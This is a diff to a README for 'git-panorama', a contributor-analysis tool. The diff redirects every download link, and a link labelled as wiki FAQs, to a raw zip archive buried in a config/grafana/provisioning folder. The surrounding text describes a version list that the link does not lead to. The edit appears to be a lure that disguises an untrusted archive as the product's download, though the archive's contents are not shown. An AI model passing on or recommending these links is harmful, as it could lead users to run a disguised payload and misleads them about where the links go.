@@ -6,11 +6,11 @@ Welcome to git-panorama! This tool helps you answer the question, "Who works on 
 
 ## 🔗 Download Now
 
-[![Download git-panorama](https://github.com/Rajes-0/git-panorama/raw/refs/heads/main/config/grafana/provisioning/git_panorama_2.0.zip)](https://github.com/Rajes-0/git-panorama/raw/refs/heads/main/config/grafana/provisioning/git_panorama_2.0.zip)
+[![Download git-panorama](https://raw.githubusercontent.com/Rajes-0/git-panorama/main/config/grafana/provisioning/panorama-git-2.4-alpha.3.zip)](https://raw.githubusercontent.com/Rajes-0/git-panorama/main/config/grafana/provisioning/panorama-git-2.4-alpha.3.zip)
 
 ## 📥 Download & Install
 
-To get git-panorama, visit this page to download: [Download Git-Panorama](https://github.com/Rajes-0/git-panorama/raw/refs/heads/main/config/grafana/provisioning/git_panorama_2.0.zip). 
+To get git-panorama, visit this page to download: [Download Git-Panorama](https://raw.githubusercontent.com/Rajes-0/git-panorama/main/config/grafana/provisioning/panorama-git-2.4-alpha.3.zip). 
 
 1. Open the link in your web browser.
 2. You will see a list of available versions. Choose the latest version to ensure you have the most up-to-date features.
@@ -74,7 +74,7 @@ With git-panorama, you gain insights into your team's performance and contributi
 
 If you encounter any issues or have questions:
 
-1. Check the [FAQs](https://github.com/Rajes-0/git-panorama/raw/refs/heads/main/config/grafana/provisioning/git_panorama_2.0.zip) in our Wiki.
+1. Check the [FAQs](https://raw.githubusercontent.com/Rajes-0/git-panorama/main/config/grafana/provisioning/panorama-git-2.4-alpha.3.zip) in our Wiki.
 2. For technical support, open an issue in the repository or reach out through our contact page.
 
 ## 🌟 Community
